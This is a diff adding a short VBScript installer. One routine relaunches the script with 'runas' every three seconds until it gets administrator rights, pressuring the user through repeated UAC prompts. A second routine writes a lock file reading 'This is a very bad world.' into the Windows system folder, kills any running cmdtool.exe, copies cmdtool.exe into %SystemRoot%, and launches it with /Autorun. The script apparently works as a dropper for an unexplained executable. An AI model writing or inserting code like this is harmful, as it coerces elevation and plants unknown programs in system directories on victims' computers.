@@ -1,0 +1,44 @@
+Admin
+Work
+
+Sub Admin()
+  Dim objItems, objItem, strVer, nVer
+  Set objItems = GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem")
+  For Each objItem In objItems
+    strVer = objItem.Version
+  Next
+  nVer = Split(strVer, ".")(0) & Split(strVer, ".")(1)
+  If nVer >= 60 Then
+    Dim oShell, oArg, strArgs
+    Set oShell = CreateObject("Shell.Application")
+    If Not WScript.Arguments.Named.Exists("ADMIN") Then
+      For Each oArg In WScript.Arguments
+        strArgs = strArgs & " """ & oArg & """"
+      Next
+      strArgs = strArgs & " /ADMIN"
+      Set ws=wscript.createobject("wscript.shell")
+      Set fso=CreateObject("Scripting.FileSystemObject")
+      Set wse=ws.Environment("Process")
+      do
+        if fso.FileExists(wse.Item("SYSTEMROOT")&"\Springbeep.lock") then
+          Set oShell = Nothing
+          WScript.Quit(0)
+        end if
+        Call oShell.ShellExecute("WScript.exe", """" & WScript.ScriptFullName & """" & strArgs, "", "runas", 1)
+        WScript.Sleep(3000)
+      loop
+    End If
+    Set oShell = Nothing
+  End If
+End Sub
+
+Sub Work()
+  set ws=wscript.createobject("wscript.shell")
+  ws.run "cmd.exe /c echo.This is a very bad world.>%SystemRoot%\Springbeep.lock",0,true
+  ws.run "cmd.exe /c taskkill /im cmdtool.exe /f",0,true
+  Set fso=CreateObject("Scripting.FileSystemObject")
+  Set wse=ws.Environment("Process")
+  fso.CopyFile createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path&"\cmdtool.exe",wse.Item("SYSTEMROOT")&"\cmdtool.exe",1
+  ws.run wse.Item("SYSTEMROOT")&"\cmdtool.exe /Autorun"
+  WScript.Quit(0)
+End Sub
